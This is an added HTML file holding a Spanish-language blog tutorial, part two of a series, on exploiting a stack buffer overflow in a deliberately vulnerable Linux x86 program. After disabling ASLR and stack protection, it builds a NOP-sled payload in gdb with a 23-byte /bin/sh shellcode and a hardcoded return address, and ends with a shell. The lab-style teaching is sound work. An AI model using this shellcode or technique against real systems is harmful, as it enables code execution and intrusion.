@@ -1,0 +1,323 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Desbordando el buffer en linux x86 (II) [NOP Sled] - Security</title>
+  <meta name="author" content="q3rv0">
+
+  
+  <meta name="description" content="En el anterior post se hizo una pequeña introduccion al funcionamiento del stack y a los registros del procesador, ademas se logro modificar el flujo &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://q3rv0.github.io/blog/2014/11/24/desbordando-el-buffer-en-linux-x86-ii-nop-sled/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="/javascripts/ender.js"></script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <link href="/atom.xml" rel="alternate" title="Security" type="application/atom+xml">
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=Arvo:400,400italic,700,700italic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=Playball" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body>
+  <header role="banner"><hgroup>
+  <h1><a href="/">Security</a></h1>
+  
+    <h2>Follow the white rabbit&#8230;.</h2>
+  
+</hgroup>
+
+</header>
+  <div id="navigation">
+    <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:q3rv0.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  </div>
+  <div id="body"  >
+    <div id="main">
+      <div id="content">
+        <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Desbordando El Buffer en Linux X86 (II) [NOP Sled]</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-11-24T21:32:57+06:30" pubdate data-updated="true"></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>En el anterior post se hizo una pequeña introduccion al funcionamiento del stack y a los registros del procesador, ademas se logro modificar el flujo<!--more--> de datos de un programa para que atente a una funcion que no habia sido llamada.</p>
+
+<p>En este nuevo apartado se vera como inyectar un shellcode en la memoria para lograr ejecutar codigo a travez del desbordamiento.</p>
+
+<p>Para el poc se va a utlizar el mismo source que la vez pasada salvo que el buffer aumentara su tamaño a 500 bytes.
+Seguimos lo mismos pasos que en el paper anterior.</p>
+
+<p>Desactivamos ASLR</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">echo </span><span class="m">0</span> &gt; /proc/sys/kernel/randomize_va_space
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>y compilamos</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>gcc -ggdb -fno-stack-protector -mpreferred-stack-boundary<span class="o">=</span><span class="m">2</span> -o vuln vuln.c
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Abrimos gdb y arrancamos por pasarle 506 caracteres</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>run $(python -c 'print "\x41"*506')</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="http://i.imgur.com/mGWY0Ol.png?1"></p>
+
+<p>Ya vemos como se va llenando el EIP</p>
+
+<p>Agregamos 2 mas y lo terminamos de completar.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>run $(python -c 'print "\x41"*508')</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="http://i.imgur.com/R9umyqW.png?1"></p>
+
+<p>Ahora bien hasta aca todo perfecto, ahora tenemos que buscar donde poder incrustar el shellcode.</p>
+
+<p>Un shellcode no es mas que un conjunto de instrucciones en ensamblador programado para una tarea especifica, el shellcode que se vera a continuacion nos dara una sesion sh en el sistema. Como dije anteriormente una vez que pasamos el tamaño limite del buffer, los datos comienzan a escribirse en los demas registros, entonces vamos a ver en que otro lugar se mandaron las A’s, si le echamos una ojeada al registro ESP.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>x/100x $esp</span></code></pre></td></tr></table></div></figure>
+
+
+<p>El anterior comando nos mostrara 100 direcciones dentro de ESP</p>
+
+<p><img src="http://i.imgur.com/vBRo9C0.png?1"></p>
+
+<p>Se puede ver que parte del buffer se ha inyectado al registro, perfect!
+Ahora solamente tenenemos que buscar/generar un shellcode acorde a nuestra arquitectura y OS</p>
+
+<p>Podriamos generarlo con metasploit, pero para este apartado voy a utilizar uno que encontre en shell-storm</p>
+
+<p><a href="http://shell-storm.org/shellcode/files/shellcode-827.php">http://shell-storm.org/shellcode/files/shellcode-827.php</a></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80</span></code></pre></td></tr></table></div></figure>
+
+
+<p>El shellcode tiene un tamaño de 23 bytes por le que le restamos la long al buffer-4 bytes pertenecientes al EIP y lo incluimos dentro del payload</p>
+
+<p>Quedando asi</p>
+
+<p>508 NOPS – 4 bytes (EIP) =504</p>
+
+<p>504 NOPS – 23 bytes (SHELLCODE) = 481 NOPS</p>
+
+<p>Payload= \x90*481+shellcode(23)+EIP(4)</p>
+
+<p>En este punto paso a explicar algo, por que reemplaze \x41 por \x90?</p>
+
+<p>\x90 es un NOP (no operacion), un NOP es una instruccion en ensamblador que simplemente no hace nada y nos servira como puente al shellcode que se escribe despues de esta.</p>
+
+<p>Ahora miremos como quedo el ESP luego de inyectar el payload, para esta ejecucion reemplaze el EIP por \x42=B.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>run $(python -c 'print "\x90"*481+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"+"\x42"*4')</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>x/100x $esp</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="http://i.imgur.com/M9lIAg0.png?1"></p>
+
+<p>En el recuadro verde vemos como se colaron los NOPS y en el rojo se ve como empieza a filtrarse el shellcode.</p>
+
+<p>Ahora lo unico que tenemos que hacer es indicar en el EIP cualquier direccion de memoria en donde se hayan alojado los NOPS</p>
+
+<p><img src="http://i.imgur.com/ij5uY3D.png?1"></p>
+
+<p>Usaremos esta : 0xbffffc70</p>
+
+<p>La invertimos, inyectamos y esperamos la shell!</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>run $(python -c 'print "\x90"*481+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"+"\x70\xfc\xff\xbf"')</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="http://i.imgur.com/x1vl6vW.png?1"></p>
+
+<p>Hasta el momento se vio como explotar satisfactoriamente el desbordamiento, desactivando previamente ASLR para el proximo se vera una forma de bypassear ese sistema de seguridad. saludos!</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">q3rv0</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-11-24T21:32:57+06:30" pubdate data-updated="true"></time>
+      
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://q3rv0.github.io/blog/2014/11/24/desbordando-el-buffer-en-linux-x86-ii-nop-sled/" data-via="q3rv0" data-counturl="http://q3rv0.github.io/blog/2014/11/24/desbordando-el-buffer-en-linux-x86-ii-nop-sled/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2014/11/23/desbordando-el-buffer-en-linux-x86-i/" title="Previous Post: Desbordando el buffer en linux x86 (I)">&laquo; Desbordando el buffer en linux x86 (I)</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2014/11/24/desbordando-el-buffer-en-linux-x86-iii-aslr-bypass/" title="Next Post: Desbordando el buffer en linux x86 (III) [ASLR bypass]">Desbordando el buffer en linux x86 (III) [ASLR bypass] &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2014/11/24/desbordando-el-buffer-en-linux-x86-iii-aslr-bypass/">Desbordando el buffer en linux x86 (III) [ASLR bypass]</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/11/24/desbordando-el-buffer-en-linux-x86-ii-nop-sled/">Desbordando el buffer en linux x86 (II) [NOP Sled]</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/11/23/desbordando-el-buffer-en-linux-x86-i/">Desbordando el buffer en linux x86 (I)</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/11/23/tomando-el-control-de-una-camara-axis-parte-i/">Tomando el control de una camara AXIS – Parte I</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/11/23/escribiendo-un-auxiliar-para-msf/">Escribiendo un auxiliar para MSF</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+      </div>
+    </div>
+    <footer role="contentinfo"><p>
+  Copyright &copy; 2014 - q3rv0 -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a>. Design by <a href="http://octopressthemes.com">Octopress Themes</a></span>
+</p>
+
+</footer>
+    
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+  </div>
+</body>
+</html>
